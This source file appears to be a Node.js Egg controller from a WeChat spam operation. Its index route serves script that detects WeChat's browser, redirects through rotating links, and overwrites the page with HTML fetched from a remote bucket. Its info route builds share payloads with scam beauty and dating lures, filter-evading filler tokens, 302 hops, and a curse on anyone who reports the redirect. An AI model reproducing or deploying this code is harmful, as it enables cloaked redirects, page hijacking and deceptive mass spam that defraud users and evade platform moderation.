'use strict';

const Controller = require('egg').Controller;
const atob = require('atob');
const btoa = require('btoa');
const rds = require('../../data/302');

class BxJqController extends Controller {
  async index() {

    const {
      ctx,
      service
    } = this;

    await service.refer.check();

    let playing_link = await service.url.getRandomLink(null, 'playing_link', '05ez.com');

    const now = parseInt(Date.now() / 1000);
    playing_link = `${playing_link}?now=${now}`;
    playing_link = service.url.getRedirectLink(playing_link);
    ctx.set({
      'content-type': "application/x-javascript"
    });

    const data = `
                function _getParam(name) {
                return location.href.match(new RegExp('[?&]' + name + '=([^?&#]+)', 'i')) ? decodeURIComponent(RegExp.$1) : '';
                }
                var ua = navigator.userAgent.toLowerCase();
                  if (/micromessenger/.test(ua)) {
                    if(_getParam('from')){
                        if (top != window || !document.body) {
                          top.location.href = '${playing_link}';
                        } else {
                          var a = document.createElement('a');
                          a.href = '${playing_link}';
                          a.rel = 'noreferrer';
                          a.click();
                        }
                      }else{
                        var _lay=document.createElement('div');_lay.setAttribute('style','width:100%;height:2048px;font-size:1.4em;position:absolute;background-color:white;z-index:99999999;left:0;top:0;');_lay.innerHTML='<div style="color:black;text-align:center;font-size:1.3em">loading...</div>';if(document.body)document.body.appendChild(_lay);document.title="正在打开...";var xhr=new XMLHttpRequest;var html=null;function getParam(name,url){var r=new RegExp('(\?|#|&)'+name+'=(.*?)(#|&|$)');var m=(url||location.href).match(r);return(m?m[2]:'')}function render(){var a=document.open("text/html","replace");a.write(html);a.close()}xhr.onload=function(){html=xhr.responseText;var delay=0;if(delay>0)setTimeout("render()",delay*1000);else render()};xhr.open("GET","https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/jq/s_bx.html?t="+Date.now(),!0);xhr.send();
                    }
                }`

    ctx.body = data;

  }

  async info() {

    const {
      ctx,
      service,
      app
    } = this;
    ctx.set({
      'content-type': "application/x-javascript"
    });

    const domain = '024ketch.com';
    // let jump_link = await service.url.getRandomLink(null, 'jump_link', domian);
    // let jump_link_pyq = await service.url.getRandomLink(null, 'jump_link_pyq', domian);
    // let rd = await service.url.getRandomLink(null, '302', domian);

    const kk = service.refer.getReferParam('kk');
    let appid;
    if (kk) {
      appid = atob(kk);
    } else {
      const key = `2:gzh:${domain}`;
      const res = await app.redis.srandmember(key, 1);
      appid = res.length > 0 ? res[0] : '';
    }

    const jump_link_key = `2:gzh:${appid}:${domain}:jump_link`;
    const jump_link_pyq_key = `2:gzh:${appid}:${domain}:jump_link_pyq`;
    const rdKey = `2:gzh:${appid}:${domain}:302`;

    let jump_link = await app.redis.srandmember(jump_link_key, 1);
    let jump_link_pyq = await app.redis.srandmember(jump_link_pyq_key, 1);
    let rd = await app.redis.srandmember(rdKey, 1);

    const bx = {
      type: 'qb2',
      title: '',
      desc:'急{fuck}速{fuck}祛{fuck}斑 美{fuck}白 平{fuck}皱{fuck}纹，祛{fuck}痘{fuck}印，无斑点{fuck}一招就搞{fuck}定，让{fuck}您水{fuck}嫩{fuck}年{fuck}轻18岁！@所{fuck}{fuck}有人',
      img: 'https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/qb2.jpeg'
    }

    // const bx = {
    //   title: '邀{fuck}请{fuck}你{fuck}加入{fuck}群聊',
    //   type: 'wz10',
    //   desc: '{city}"娇娇"{fuck}邀请你{fuck}{fuck}加入群聊，90{fuck}后单身妹{fuck}{fuck}子日子过万群，进群查{fuck}{fuck}看详情',
    //   img: 'https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/1.jpg'
    // }

    const spam = service.url.getSpm();
    const now = parseInt(Date.now() / 1000);
    jump_link = service.url.addParam(jump_link, {
      [spam]: spam,
      type: bx.type
    }).replace('{spamnum}', now)

    jump_link_pyq = service.url.addParam(jump_link_pyq, {
      [spam]: spam,
      type: bx.type
    }).replace('{spamnum}', now)

    if (rd.length > 0) {
      rd = rd[0];
      jump_link = rd.replace('{encodeUrl}', encodeURIComponent(jump_link))
      jump_link_pyq = rd.replace('{encodeUrl}', encodeURIComponent(jump_link_pyq))
    }

    const data = {
      "注意": "举报跳板死全家",
      "ad": {
        "app_url": jump_link,
        "timeline_url": jump_link_pyq,
        //"title": "{fuck}",
        "desc": bx.title,
        "img": bx.img,
        "title": ""
      },
      "attached": {
        "case": "hun-hb",
        "signmode": "jssdk",
        "back_api": "https://akqgyc.com/backup/args/xj_back.php",
        "ad_share": {
          "pyq": [0, 0],
          "qun": [0, 0, 0, 0]
        },
        "timeline_ad": true,
        "needWhite": true,
        "group_ad": true,
        "jfs": false
      },
      "cnzz": "",
      "hm": "46ea4995fb6116f9430b8379f5c18d8c",
      "to_timeline": {
        "img": bx.img,
        "title": bx.desc,
        // "title": "",
        // "img": "http://butuyu.oss-cn-hangzhou.aliyuncs.com/Img_hb/voice.jpg",
        "landing": "",
        "link": jump_link_pyq,
        "desc": bx.desc
      },
      "to_group": {
        "redirect": "",
        "link": jump_link,
        "img": bx.img,
        "title": bx.title,
        "desc": bx.desc
        // "title": "🎂{fuck}我的͏{fuck}生͏日宴͏{fuck}派{fuck}喜͏钱啦！",
        // "desc": '送上您的生日祝福，领取小小心意>>',
      }
    }
    ctx.body = `
          window.data = ${JSON.stringify(data)}
          `
  }
}

module.exports = BxJqController;